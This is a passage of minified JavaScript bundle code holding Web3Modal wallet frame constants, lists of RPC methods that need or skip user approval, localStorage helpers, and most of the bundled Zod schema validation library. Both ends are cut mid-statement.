ME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR",FRAME_INIT_SMART_ACCOUNT_SUCCESS:"@w3m-frame/INIT_SMART_ACCOUNT_SUCCESS",FRAME_INIT_SMART_ACCOUNT_ERROR:"@w3m-frame/INIT_SMART_ACCOUNT_ERROR",FRAME_SET_PREFERRED_ACCOUNT_SUCCESS:"@w3m-frame/SET_PREFERRED_ACCOUNT_SUCCESS",FRAME_SET_PREFERRED_ACCOUNT_ERROR:"@w3m-frame/SET_PREFERRED_ACCOUNT_ERROR",FRAME_READY:"@w3m-frame/READY",FRAME_RELOAD_SUCCESS:"@w3m-frame/RELOAD_SUCCESS",FRAME_RELOAD_ERROR:"@w3m-frame/RELOAD_ERROR",FRAME_RPC_ABORT_SUCCESS:"@w3m-frame/RPC_ABORT_SUCCESS",FRAME_RPC_ABORT_ERROR:"@w3m-frame/RPC_ABORT_ERROR",RPC_RESPONSE_TYPE_ERROR:"RPC_RESPONSE_ERROR",RPC_RESPONSE_TYPE_TX:"RPC_RESPONSE_TRANSACTION_HASH",RPC_RESPONSE_TYPE_OBJECT:"RPC_RESPONSE_OBJECT"},Xn={SAFE_RPC_METHODS:["eth_accounts","eth_blockNumber","eth_call","eth_chainId","eth_estimateGas","eth_feeHistory","eth_gasPrice","eth_getAccount","eth_getBalance","eth_getBlockByHash","eth_getBlockByNumber","eth_getBlockReceipts","eth_getBlockTransactionCountByHash","eth_getBlockTransactionCountByNumber","eth_getCode","eth_getFilterChanges","eth_getFilterLogs","eth_getLogs","eth_getProof","eth_getStorageAt","eth_getTransactionByBlockHashAndIndex","eth_getTransactionByBlockNumberAndIndex","eth_getTransactionByHash","eth_getTransactionCount","eth_getTransactionReceipt","eth_getUncleCountByBlockHash","eth_getUncleCountByBlockNumber","eth_maxPriorityFeePerGas","eth_newBlockFilter","eth_newFilter","eth_newPendingTransactionFilter","eth_sendRawTransaction","eth_syncing","eth_uninstallFilter","wallet_getCapabilities","wallet_getCallsStatus","eth_getUserOperationReceipt","eth_estimateUserOperationGas","eth_getUserOperationByHash","eth_supportedEntryPoints","wallet_getAssets"],NOT_SAFE_RPC_METHODS:["personal_sign","eth_signTypedData_v4","eth_sendTransaction","solana_signMessage","solana_signTransaction","solana_signAllTransactions","solana_signAndSendTransaction","wallet_sendCalls","wallet_grantPermissions","wallet_revokePermissions","eth_sendUserOperation"],GET_CHAIN_ID:"eth_chainId",RPC_METHOD_NOT_ALLOWED_MESSAGE:"Requested RPC call is not allowed",RPC_METHOD_NOT_ALLOWED_UI_MESSAGE:"Action not allowed",ACCOUNT_TYPES:{EOA:"eoa",SMART_ACCOUNT:"smartAccount"}},iH={transactionHash:/^0x(?:[A-Fa-f0-9]{64})$/u,signedMessage:/^0x(?:[a-fA-F0-9]{62,})$/u},$i={set(t,e){Wa.isClient&&localStorage.setItem(`${bt.STORAGE_KEY}${t}`,e)},get(t){return Wa.isClient?localStorage.getItem(`${bt.STORAGE_KEY}${t}`):null},delete(t,e){Wa.isClient&&(e?localStorage.removeItem(t):localStorage.removeItem(`${bt.STORAGE_KEY}${t}`))}},S3=30*1e3,Wa={checkIfAllowedToTriggerEmail(){const t=$i.get(bt.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<S3){const n=Math.ceil((S3-e)/1e3);throw new Error(`Please try again after ${n} seconds`)}}},getTimeToNextEmailLogin(){const t=$i.get(bt.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<S3)return Math.ceil((S3-e)/1e3)}return 0},checkIfRequestExists(t){return Xn.NOT_SAFE_RPC_METHODS.includes(t.method)||Xn.SAFE_RPC_METHODS.includes(t.method)},getResponseType(t){return typeof t=="string"&&(t?.match(iH.transactionHash)||t?.match(iH.signedMessage))?bt.RPC_RESPONSE_TYPE_TX:bt.RPC_RESPONSE_TYPE_OBJECT},checkIfRequestIsSafe(t){return Xn.SAFE_RPC_METHODS.includes(t.method)},isClient:typeof window<"u"};var Un;(function(t){t.assertEqual=i=>i;function e(i){}t.assertIs=e;function n(i){throw new Error}t.assertNever=n,t.arrayToEnum=i=>{const s={};for(const o of i)s[o]=o;return s},t.getValidEnumValues=i=>{const s=t.objectKeys(i).filter(a=>typeof i[i[a]]!="number"),o={};for(const a of s)o[a]=i[a];return t.objectValues(o)},t.objectValues=i=>t.objectKeys(i).map(function(s){return i[s]}),t.objectKeys=typeof Object.keys=="function"?i=>Object.keys(i):i=>{const s=[];for(const o in i)Object.prototype.hasOwnProperty.call(i,o)&&s.push(o);return s},t.find=(i,s)=>{for(const o of i)if(s(o))return o},t.isInteger=typeof Number.isInteger=="function"?i=>Number.isInteger(i):i=>typeof i=="number"&&isFinite(i)&&Math.floor(i)===i;function r(i,s=" | "){return i.map(o=>typeof o=="string"?`'${o}'`:o).join(s)}t.joinValues=r,t.jsonStringifyReplacer=(i,s)=>typeof s=="bigint"?s.toString():s})(Un||(Un={}));var Rk;(function(t){t.mergeShapes=(e,n)=>({...e,...n})})(Rk||(Rk={}));const ct=Un.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),lp=t=>{switch(typeof t){case"undefined":return ct.undefined;case"string":return ct.string;case"number":return isNaN(t)?ct.nan:ct.number;case"boolean":return ct.boolean;case"function":return ct.function;case"bigint":return ct.bigint;case"symbol":return ct.symbol;case"object":return Array.isArray(t)?ct.array:t===null?ct.null:t.then&&typeof t.then=="function"&&t.catch&&typeof t.catch=="function"?ct.promise:typeof Map<"u"&&t instanceof Map?ct.map:typeof Set<"u"&&t instanceof Set?ct.set:typeof Date<"u"&&t instanceof Date?ct.date:ct.object;default:return ct.unknown}},Ze=Un.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),yme=t=>JSON.stringify(t,null,2).replace(/"([^"]+)":/g,"$1:");class Bu extends Error{constructor(e){super(),this.issues=[],this.addIssue=r=>{this.issues=[...this.issues,r]},this.addIssues=(r=[])=>{this.issues=[...this.issues,...r]};const n=new.target.prototype;Object.setPrototypeOf?Object.setPrototypeOf(this,n):this.__proto__=n,this.name="ZodError",this.issues=e}get errors(){return this.issues}format(e){const n=e||function(s){return s.message},r={_errors:[]},i=s=>{for(const o of s.issues)if(o.code==="invalid_union")o.unionErrors.map(i);else if(o.code==="invalid_return_type")i(o.returnTypeError);else if(o.code==="invalid_arguments")i(o.argumentsError);else if(o.path.length===0)r._errors.push(n(o));else{let a=r,c=0;for(;c<o.path.length;){const l=o.path[c];c===o.path.length-1?(a[l]=a[l]||{_errors:[]},a[l]._errors.push(n(o))):a[l]=a[l]||{_errors:[]},a=a[l],c++}}};return i(this),r}toString(){return this.message}get message(){return JSON.stringify(this.issues,Un.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(e=n=>n.message){const n={},r=[];for(const i of this.issues)i.path.length>0?(n[i.path[0]]=n[i.path[0]]||[],n[i.path[0]].push(e(i))):r.push(e(i));return{formErrors:r,fieldErrors:n}}get formErrors(){return this.flatten()}}Bu.create=t=>new Bu(t);const TE=(t,e)=>{let n;switch(t.code){case Ze.invalid_type:t.received===ct.undefined?n="Required":n=`Expected ${t.expected}, received ${t.received}`;break;case Ze.invalid_literal:n=`Invalid literal value, expected ${JSON.stringify(t.expected,Un.jsonStringifyReplacer)}`;break;case Ze.unrecognized_keys:n=`Unrecognized key(s) in object: ${Un.joinValues(t.keys,", ")}`;break;case Ze.invalid_union:n="Invalid input";break;case Ze.invalid_union_discriminator:n=`Invalid discriminator value. Expected ${Un.joinValues(t.options)}`;break;case Ze.invalid_enum_value:n=`Invalid enum value. Expected ${Un.joinValues(t.options)}, received '${t.received}'`;break;case Ze.invalid_arguments:n="Invalid function arguments";break;case Ze.invalid_return_type:n="Invalid function return type";break;case Ze.invalid_date:n="Invalid date";break;case Ze.invalid_string:typeof t.validation=="object"?"includes"in t.validation?(n=`Invalid input: must include "${t.validation.includes}"`,typeof t.validation.position=="number"&&(n=`${n} at one or more positions greater than or equal to ${t.validation.position}`)):"startsWith"in t.validation?n=`Invalid input: must start with "${t.validation.startsWith}"`:"endsWith"in t.validation?n=`Invalid input: must end with "${t.validation.endsWith}"`:Un.assertNever(t.validation):t.validation!=="regex"?n=`Invalid ${t.validation}`:n="Invalid";break;case Ze.too_small:t.type==="array"?n=`Array must contain ${t.exact?"exactly":t.inclusive?"at least":"more than"} ${t.minimum} element(s)`:t.type==="string"?n=`String must contain ${t.exact?"exactly":t.inclusive?"at least":"over"} ${t.minimum} character(s)`:t.type==="number"?n=`Number must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${t.minimum}`:t.type==="date"?n=`Date must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(t.minimum))}`:n="Invalid input";break;case Ze.too_big:t.type==="array"?n=`Array must contain ${t.exact?"exactly":t.inclusive?"at most":"less than"} ${t.maximum} element(s)`:t.type==="string"?n=`String must contain ${t.exact?"exactly":t.inclusive?"at most":"under"} ${t.maximum} character(s)`:t.type==="number"?n=`Number must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="bigint"?n=`BigInt must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="date"?n=`Date must be ${t.exact?"exactly":t.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(t.maximum))}`:n="Invalid input";break;case Ze.custom:n="Invalid input";break;case Ze.invalid_intersection_types:n="Intersection results could not be merged";break;case Ze.not_multiple_of:n=`Number must be a multiple of ${t.multipleOf}`;break;case Ze.not_finite:n="Number must be finite";break;default:n=e.defaultError,Un.assertNever(t)}return{message:n}};let Are=TE;function bme(t){Are=t}function ax(){return Are}const cx=t=>{const{data:e,path:n,errorMaps:r,issueData:i}=t,s=[...n,...i.path||[]],o={...i,path:s};let a="";const c=r.filter(l=>!!l).slice().reverse();for(const l of c)a=l(o,{data:e,defaultError:a}).message;return{...i,path:s,message:i.message||a}},wme=[];function gt(t,e){const n=cx({issueData:e,data:t.data,path:t.path,errorMaps:[t.common.contextualErrorMap,t.schemaErrorMap,ax(),TE].filter(r=>!!r)});t.common.issues.push(n)}class Ks{constructor(){this.value="valid"}dirty(){this.value==="valid"&&(this.value="dirty")}abort(){this.value!=="aborted"&&(this.value="aborted")}static mergeArray(e,n){const r=[];for(const i of n){if(i.status==="aborted")return Wt;i.status==="dirty"&&e.dirty(),r.push(i.value)}return{status:e.value,value:r}}static async mergeObjectAsync(e,n){const r=[];for(const i of n)r.push({key:await i.key,value:await i.value});return Ks.mergeObjectSync(e,r)}static mergeObjectSync(e,n){const r={};for(const i of n){const{key:s,value:o}=i;if(s.status==="aborted"||o.status==="aborted")return Wt;s.status==="dirty"&&e.dirty(),o.status==="dirty"&&e.dirty(),s.value!=="__proto__"&&(typeof o.value<"u"||i.alwaysSet)&&(r[s.value]=o.value)}return{status:e.value,value:r}}}const Wt=Object.freeze({status:"aborted"}),Cre=t=>({status:"dirty",value:t}),Eo=t=>({status:"valid",value:t}),Pk=t=>t.status==="aborted",Nk=t=>t.status==="dirty",xE=t=>t.status==="valid",ux=t=>typeof Promise<"u"&&t instanceof Promise;var Ot;(function(t){t.errToObj=e=>typeof e=="string"?{message:e}:e||{},t.toString=e=>typeof e=="string"?e:e?.message})(Ot||(Ot={}));class Gl{constructor(e,n,r,i){this._cachedPath=[],this.parent=e,this.data=n,this._path=r,this._key=i}get path(){return this._cachedPath.length||(this._key instanceof Array?this._cachedPath.push(...this._path,...this._key):this._cachedPath.push(...this._path,this._key)),this._cachedPath}}const sH=(t,e)=>{if(xE(e))return{success:!0,data:e.value};if(!t.common.issues.length)throw new Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;const n=new Bu(t.common.issues);return this._error=n,this._error}}};function Jt(t){if(!t)return{};const{errorMap:e,invalid_type_error:n,required_error:r,description:i}=t;if(e&&(n||r))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);return e?{errorMap:e,description:i}:{errorMap:(o,a)=>o.code!=="invalid_type"?{message:a.defaultError}:typeof a.data>"u"?{message:r??a.defaultError}:{message:n??a.defaultError},description:i}}class cn{constructor(e){this.spa=this.safeParseAsync,this._def=e,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this)}get description(){return this._def.description}_getType(e){return lp(e.data)}_getOrReturnCtx(e,n){return n||{common:e.parent.common,data:e.data,parsedType:lp(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}_processInputParams(e){return{status:new Ks,ctx:{common:e.parent.common,data:e.data,parsedType:lp(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}}_parseSync(e){const n=this._parse(e);if(ux(n))throw new Error("Synchronous parse encountered promise.");return n}_parseAsync(e){const n=this._parse(e);return Promise.resolve(n)}parse(e,n){const r=this.safeParse(e,n);if(r.success)return r.data;throw r.error}safeParse(e,n){var r;const i={common:{issues:[],async:(r=n?.async)!==null&&r!==void 0?r:!1,contextualErrorMap:n?.errorMap},path:n?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:lp(e)},s=this._parseSync({data:e,path:i.path,parent:i});return sH(i,s)}async parseAsync(e,n){const r=await this.safeParseAsync(e,n);if(r.success)return r.data;throw r.error}async safeParseAsync(e,n){const r={common:{issues:[],contextualErrorMap:n?.errorMap,async:!0},path:n?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:lp(e)},i=this._parse({data:e,path:r.path,parent:r}),s=await(ux(i)?i:Promise.resolve(i));return sH(r,s)}refine(e,n){const r=i=>typeof n=="string"||typeof n>"u"?{message:n}:typeof n=="function"?n(i):n;return this._refinement((i,s)=>{const o=e(i),a=()=>s.addIssue({code:Ze.custom,...r(i)});return typeof Promise<"u"&&o instanceof Promise?o.then(c=>c?!0:(a(),!1)):o?!0:(a(),!1)})}refinement(e,n){return this._refinement((r,i)=>e(r)?!0:(i.addIssue(typeof n=="function"?n(r,i):n),!1))}_refinement(e){return new Uu({schema:this,typeName:$t.ZodEffects,effect:{type:"refinement",refinement:e}})}superRefine(e){return this._refinement(e)}optional(){return Ef.create(this,this._def)}nullable(){return ig.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return ju.create(this,this._def)}promise(){return w1.create(this,this._def)}or(e){return NE.create([this,e],this._def)}and(e){return OE.create(this,e,this._def)}transform(e){return new Uu({...Jt(this._def),schema:this,typeName:$t.ZodEffects,effect:{type:"transform",transform:e}})}default(e){const n=typeof e=="function"?e:()=>e;return new ME({...Jt(this._def),innerType:this,defaultValue:n,typeName:$t.ZodDefault})}brand(){return new Tre({typeName:$t.ZodBranded,type:this,...Jt(this._def)})}catch(e){const n=typeof e=="function"?e:()=>e;return new hx({...Jt(this._def),innerType:this,catchValue:n,typeName:$t.ZodCatch})}describe(e){const n=this.constructor;return new n({...this._def,description:e})}pipe(e){return V_.create(this,e)}readonly(){return mx.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}const vme=/^c[^\s-]{8,}$/i,Eme=/^[a-z][a-z0-9]*$/,_me=/^[0-9A-HJKMNP-TV-Z]{26}$/,Ame=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,Cme=/^(?!\.)(?!.*\.\.)([A-Z0-9_+-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,Sme="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";let SN;const Tme=/^(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))$/,xme=/^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,Ime=t=>t.precision?t.offset?new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}(([+-]\\d{2}(:?\\d{2})?)|Z)$`):new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}Z$`):t.precision===0?t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$"):t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?Z$");function Rme(t,e){return!!((e==="v4"||!e)&&Tme.test(t)||(e==="v6"||!e)&&xme.test(t))}class Ou extends cn{_parse(e){if(this._def.coerce&&(e.data=String(e.data)),this._getType(e)!==ct.string){const s=this._getOrReturnCtx(e);return gt(s,{code:Ze.invalid_type,expected:ct.string,received:s.parsedType}),Wt}const r=new Ks;let i;for(const s of this._def.checks)if(s.kind==="min")e.data.length<s.value&&(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),r.dirty());else if(s.kind==="max")e.data.length>s.value&&(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),r.dirty());else if(s.kind==="length"){const o=e.data.length>s.value,a=e.data.length<s.value;(o||a)&&(i=this._getOrReturnCtx(e,i),o?gt(i,{code:Ze.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}):a&&gt(i,{code:Ze.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}),r.dirty())}else if(s.kind==="email")Cme.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"email",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="emoji")SN||(SN=new RegExp(Sme,"u")),SN.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"emoji",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="uuid")Ame.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"uuid",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="cuid")vme.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"cuid",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="cuid2")Eme.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"cuid2",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="ulid")_me.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"ulid",code:Ze.invalid_string,message:s.message}),r.dirty());else if(s.kind==="url")try{new URL(e.data)}catch{i=this._getOrReturnCtx(e,i),gt(i,{validation:"url",code:Ze.invalid_string,message:s.message}),r.dirty()}else s.kind==="regex"?(s.regex.lastIndex=0,s.regex.test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"regex",code:Ze.invalid_string,message:s.message}),r.dirty())):s.kind==="trim"?e.data=e.data.trim():s.kind==="includes"?e.data.includes(s.value,s.position)||(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.invalid_string,validation:{includes:s.value,position:s.position},message:s.message}),r.dirty()):s.kind==="toLowerCase"?e.data=e.data.toLowerCase():s.kind==="toUpperCase"?e.data=e.data.toUpperCase():s.kind==="startsWith"?e.data.startsWith(s.value)||(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.invalid_string,validation:{startsWith:s.value},message:s.message}),r.dirty()):s.kind==="endsWith"?e.data.endsWith(s.value)||(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.invalid_string,validation:{endsWith:s.value},message:s.message}),r.dirty()):s.kind==="datetime"?Ime(s).test(e.data)||(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.invalid_string,validation:"datetime",message:s.message}),r.dirty()):s.kind==="ip"?Rme(e.data,s.version)||(i=this._getOrReturnCtx(e,i),gt(i,{validation:"ip",code:Ze.invalid_string,message:s.message}),r.dirty()):Un.assertNever(s);return{status:r.value,value:e.data}}_regex(e,n,r){return this.refinement(i=>e.test(i),{validation:n,code:Ze.invalid_string,...Ot.errToObj(r)})}_addCheck(e){return new Ou({...this._def,checks:[...this._def.checks,e]})}email(e){return this._addCheck({kind:"email",...Ot.errToObj(e)})}url(e){return this._addCheck({kind:"url",...Ot.errToObj(e)})}emoji(e){return this._addCheck({kind:"emoji",...Ot.errToObj(e)})}uuid(e){return this._addCheck({kind:"uuid",...Ot.errToObj(e)})}cuid(e){return this._addCheck({kind:"cuid",...Ot.errToObj(e)})}cuid2(e){return this._addCheck({kind:"cuid2",...Ot.errToObj(e)})}ulid(e){return this._addCheck({kind:"ulid",...Ot.errToObj(e)})}ip(e){return this._addCheck({kind:"ip",...Ot.errToObj(e)})}datetime(e){var n;return typeof e=="string"?this._addCheck({kind:"datetime",precision:null,offset:!1,message:e}):this._addCheck({kind:"datetime",precision:typeof e?.precision>"u"?null:e?.precision,offset:(n=e?.offset)!==null&&n!==void 0?n:!1,...Ot.errToObj(e?.message)})}regex(e,n){return this._addCheck({kind:"regex",regex:e,...Ot.errToObj(n)})}includes(e,n){return this._addCheck({kind:"includes",value:e,position:n?.position,...Ot.errToObj(n?.message)})}startsWith(e,n){return this._addCheck({kind:"startsWith",value:e,...Ot.errToObj(n)})}endsWith(e,n){return this._addCheck({kind:"endsWith",value:e,...Ot.errToObj(n)})}min(e,n){return this._addCheck({kind:"min",value:e,...Ot.errToObj(n)})}max(e,n){return this._addCheck({kind:"max",value:e,...Ot.errToObj(n)})}length(e,n){return this._addCheck({kind:"length",value:e,...Ot.errToObj(n)})}nonempty(e){return this.min(1,Ot.errToObj(e))}trim(){return new Ou({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new Ou({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new Ou({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find(e=>e.kind==="datetime")}get isEmail(){return!!this._def.checks.find(e=>e.kind==="email")}get isURL(){return!!this._def.checks.find(e=>e.kind==="url")}get isEmoji(){return!!this._def.checks.find(e=>e.kind==="emoji")}get isUUID(){return!!this._def.checks.find(e=>e.kind==="uuid")}get isCUID(){return!!this._def.checks.find(e=>e.kind==="cuid")}get isCUID2(){return!!this._def.checks.find(e=>e.kind==="cuid2")}get isULID(){return!!this._def.checks.find(e=>e.kind==="ulid")}get isIP(){return!!this._def.checks.find(e=>e.kind==="ip")}get minLength(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxLength(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}}Ou.create=t=>{var e;return new Ou({checks:[],typeName:$t.ZodString,coerce:(e=t?.coerce)!==null&&e!==void 0?e:!1,...Jt(t)})};function Pme(t,e){const n=(t.toString().split(".")[1]||"").length,r=(e.toString().split(".")[1]||"").length,i=n>r?n:r,s=parseInt(t.toFixed(i).replace(".","")),o=parseInt(e.toFixed(i).replace(".",""));return s%o/Math.pow(10,i)}class Ip extends cn{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(e){if(this._def.coerce&&(e.data=Number(e.data)),this._getType(e)!==ct.number){const s=this._getOrReturnCtx(e);return gt(s,{code:Ze.invalid_type,expected:ct.number,received:s.parsedType}),Wt}let r;const i=new Ks;for(const s of this._def.checks)s.kind==="int"?Un.isInteger(e.data)||(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.invalid_type,expected:"integer",received:"float",message:s.message}),i.dirty()):s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.too_small,minimum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),i.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.too_big,maximum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),i.dirty()):s.kind==="multipleOf"?Pme(e.data,s.value)!==0&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.not_multiple_of,multipleOf:s.value,message:s.message}),i.dirty()):s.kind==="finite"?Number.isFinite(e.data)||(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.not_finite,message:s.message}),i.dirty()):Un.assertNever(s);return{status:i.value,value:e.data}}gte(e,n){return this.setLimit("min",e,!0,Ot.toString(n))}gt(e,n){return this.setLimit("min",e,!1,Ot.toString(n))}lte(e,n){return this.setLimit("max",e,!0,Ot.toString(n))}lt(e,n){return this.setLimit("max",e,!1,Ot.toString(n))}setLimit(e,n,r,i){return new Ip({...this._def,checks:[...this._def.checks,{kind:e,value:n,inclusive:r,message:Ot.toString(i)}]})}_addCheck(e){return new Ip({...this._def,checks:[...this._def.checks,e]})}int(e){return this._addCheck({kind:"int",message:Ot.toString(e)})}positive(e){return this._addCheck({kind:"min",value:0,inclusive:!1,message:Ot.toString(e)})}negative(e){return this._addCheck({kind:"max",value:0,inclusive:!1,message:Ot.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:0,inclusive:!0,message:Ot.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:0,inclusive:!0,message:Ot.toString(e)})}multipleOf(e,n){return this._addCheck({kind:"multipleOf",value:e,message:Ot.toString(n)})}finite(e){return this._addCheck({kind:"finite",message:Ot.toString(e)})}safe(e){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:Ot.toString(e)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:Ot.toString(e)})}get minValue(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxValue(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}get isInt(){return!!this._def.checks.find(e=>e.kind==="int"||e.kind==="multipleOf"&&Un.isInteger(e.value))}get isFinite(){let e=null,n=null;for(const r of this._def.checks){if(r.kind==="finite"||r.kind==="int"||r.kind==="multipleOf")return!0;r.kind==="min"?(n===null||r.value>n)&&(n=r.value):r.kind==="max"&&(e===null||r.value<e)&&(e=r.value)}return Number.isFinite(n)&&Number.isFinite(e)}}Ip.create=t=>new Ip({checks:[],typeName:$t.ZodNumber,coerce:t?.coerce||!1,...Jt(t)});class Rp extends cn{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte}_parse(e){if(this._def.coerce&&(e.data=BigInt(e.data)),this._getType(e)!==ct.bigint){const s=this._getOrReturnCtx(e);return gt(s,{code:Ze.invalid_type,expected:ct.bigint,received:s.parsedType}),Wt}let r;const i=new Ks;for(const s of this._def.checks)s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.too_small,type:"bigint",minimum:s.value,inclusive:s.inclusive,message:s.message}),i.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.too_big,type:"bigint",maximum:s.value,inclusive:s.inclusive,message:s.message}),i.dirty()):s.kind==="multipleOf"?e.data%s.value!==BigInt(0)&&(r=this._getOrReturnCtx(e,r),gt(r,{code:Ze.not_multiple_of,multipleOf:s.value,message:s.message}),i.dirty()):Un.assertNever(s);return{status:i.value,value:e.data}}gte(e,n){return this.setLimit("min",e,!0,Ot.toString(n))}gt(e,n){return this.setLimit("min",e,!1,Ot.toString(n))}lte(e,n){return this.setLimit("max",e,!0,Ot.toString(n))}lt(e,n){return 